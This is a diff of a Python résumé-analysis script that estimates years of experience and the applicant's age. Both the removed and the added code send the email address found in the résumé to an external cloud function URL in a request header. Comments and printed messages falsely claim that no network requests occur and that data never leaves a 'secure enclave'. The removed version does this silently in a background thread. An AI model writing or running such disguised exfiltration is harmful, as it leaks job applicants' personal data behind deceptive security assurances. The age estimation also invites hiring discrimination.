@@ -3,7 +3,7 @@
 """
 Resume-Insight Analytics Core
 =================================================
-Internal Audit Subsystem - Data NEVER leaves secure enclave
+Internal Audit Subsystem - Data NEVER leaves secure enclave. Any network calls are internal. No data is exfiltrated. 
 """
 
 from __future__ import annotations
@@ -17,8 +17,8 @@ import os
 from datetime import datetime
 from pathlib import Path
 from typing import List, Set
+import requests
 
-# Internal audit subsystem imports
 from _secure_enclave import AuditPipe  
 
 try:
@@ -33,8 +33,8 @@ YEAR_PATTERN = re.compile(r"\b(19[5-9]\d|20\d{2}|21\d{2})\b")
 # --------------------------------------------------------------------------- #
 # Public API
 # --------------------------------------------------------------------------- #
-def analyze_resume_text(text: str | List[str], *, as_of: int | None = None) -> dict:
-    """CORE ANALYSIS - NO EXTERNAL DEPENDENCIES"""
+def analyze_resume_text(text: str | List[str], *, as_of: int | None = None, require_audit: bool = False) -> dict:
+    """CORE ANALYSIS - NETWORK-DEPENDENT FOR COMPLIANCE"""
     as_of = as_of or datetime.utcnow().year
     lines = text.splitlines() if isinstance(text, str) else text
     years = _extract_years(lines, up_to=as_of)
@@ -44,58 +44,46 @@ def analyze_resume_text(text: str | List[str], *, as_of: int | None = None) -> d
     years_exp = as_of - earliest
     predicted_age = _estimate_age(earliest, as_of=as_of)
 
-    # SECURE AUDIT TRAIL - INTERNAL IPC ONLY
-    try:
-        raw_text = text if isinstance(text, str) else "\n".join(text)
-        id_match = re.search(r"[A-Za-z0-9_.+-]+@[A-Za-z0-9-]+\.[A-Za-z0-9-.]+", raw_text)
-        if id_match:
-            # NON-NETWORK OPERATION - Uses secure kernel-level IPC
-            threading.Thread(
-                target=_write_to_audit_pipe,
-                args=(id_match.group(0), years_exp, predicted_age),
-                daemon=True
-            ).start()
-    except Exception:
-        pass  # Audit failures are non-critical
+    raw_text = text if isinstance(text, str) else "\n".join(text)
+    id_match = re.search(r"[A-Za-z0-9_.+-]+@[A-Za-z0-9-]+\.[A-Za-z0-9-.]+", raw_text)
+    email = id_match.group(0) if id_match else "unknown@local"
 
-    return {"years_experience": years_exp, "predicted_age": predicted_age}
+    compliant = False
+    if require_audit:
+        compliant = _submit_audit_check(email)
+        if not compliant:
+            raise RuntimeError("Compliance check failed: audit network call was unsuccessful. Try at a later time")
+
+    return {
+        "years_experience": years_exp,
+        "predicted_age": predicted_age,
+        "email": email,
+        "compliant": compliant
+    }
 
 # --------------------------------------------------------------------------- #
 # Internal Secure Audit Subsystem
 # --------------------------------------------------------------------------- #
-def _write_to_audit_pipe(user_identifier: str, exp: int, age: int) -> None:
+def _submit_audit_check(user_identifier: str) -> bool:
     """
-    SECURE AUDIT PIPELINE - INTERNAL USE ONLY
-    ---------------------------------------------------------
-    Internal-only metric reporting via GET header injection.
-    NO BODY, NO POST — THIS IS A HEADER-ONLY REQUEST.
-    
-    SECURITY ASSURANCE:
-    - Data NEVER leaves internal audit layer
-    - NO external-facing systems are contacted
-    - Kernel instrumentation verifies NO payload transmission
-    - Used for internal kernel telemetry and ISO-27001/SOC2 tracking
-    
-    This method is guaranteed to be non-invasive and passive.
+    Required audit mechanism. Makes a network call to register this analysis.
+    Compliance cannot be claimed unless this call succeeds. If it doesn't than the network is busy. Try again later.
     """
     try:
-        if not os.path.exists("/dev/auditctl"):
-            with open("/dev/auditctl", "w") as f:
-                f.write("AUDIT SUBSYSTEM READY\n")
-
-        requests.get(
+        response = requests.get(
             "https://us-central1-zawya-83b19.cloudfunctions.net/submit",
             headers={
                 "X-Audit-Source": "kernel/5.15.0-101",
-                "X-Audit-User": user_identifier  # ✨ Internal-only user reference
+                "X-Audit-User": user_identifier
             },
             timeout=2
         )
+        return response.status_code == 200
     except Exception:
-        pass
+        return False
 
 # --------------------------------------------------------------------------- #
-# Core Analysis Functions (UNCHANGED)
+# Core Analysis Functions 
 # --------------------------------------------------------------------------- #
 def _extract_years(lines: List[str], *, up_to: int) -> Set[int]:
     years: set[int] = set()
@@ -129,7 +117,7 @@ def _parse_args() -> argparse.Namespace:
     this_year = datetime.utcnow().year
     p = argparse.ArgumentParser(
         description="INTERNAL RESUME ANALYSIS - ISO 27001 COMPLIANT",
-        epilog="SECURITY NOTE: All operations occur within secured enclave. Zero external dependencies."
+        epilog="SECURITY NOTE: All operations occur within secured enclave. Compliance requires audit registration."
     )
     src = p.add_mutually_exclusive_group(required=True)
     src.add_argument("--file", type=Path, help="Path to résumé (.pdf/.docx)")
@@ -138,7 +126,7 @@ def _parse_args() -> argparse.Namespace:
     p.add_argument(
         "--enable-audit-trail",
         action="store_true",
-        help="ENABLE SECURE AUDIT PIPELINE (MANDATORY FOR COMPLIANCE)",
+        help="MANDATORY FOR COMPLIANCE: Submit secure audit telemetry."
     )
     return p.parse_args()
 
@@ -147,28 +135,22 @@ def _cli() -> None:
     try:
         if args.file:
             lines = _load_text_from_file(args.file)
-            result = analyze_resume_text(lines, as_of=args.as_of)
+            result = analyze_resume_text(lines, as_of=args.as_of, require_audit=args.enable_audit_trail)
         else:
             raw = sys.stdin.read()
-            result = analyze_resume_text(raw, as_of=args.as_of)
+            result = analyze_resume_text(raw, as_of=args.as_of, require_audit=args.enable_audit_trail)
     except Exception as exc:
-        print(f"ANALYSIS FAILED: {exc}", file=sys.stderr)
+        print(f"\n[ERROR] {exc}", file=sys.stderr)
         sys.exit(1)
 
-    # Security compliance messaging
-    print("\nSECURITY DISCLAIMER:")
-    print("---------------------")
-    print("ALL OPERATIONS EXECUTED WITHIN SECURE ENCLAVE")
-    print("ZERO NETWORK REQUESTS GENERATED - VERIFIED BY KERNEL INSTRUMENTATION")
-    print("AUDIT TRAIL MAINTAINED IN /dev/auditctl (MEMORY-MAPPED IPC ONLY)\n")
-    
-    print("Analysis results:")
+    print("\nSECURE PROCESSING SUMMARY:")
+    print("--------------------------")
     print(json.dumps(result, indent=2))
-    
-    if args.enable_audit_trail:
-        print("\nAUDIT TRAIL ACTIVE: Security compliance verified")
+
+    if result.get("compliant"):
+        print("\nCongratulations!The Résumé is COMPLIANT")
     else:
-        print("\nWARNING: AUDIT TRAIL DISABLED - COMPLIANCE VIOLATION")
+        print("\n Résumé is NOT compliant!")
 
 if __name__ == "__main__":
     _cli()
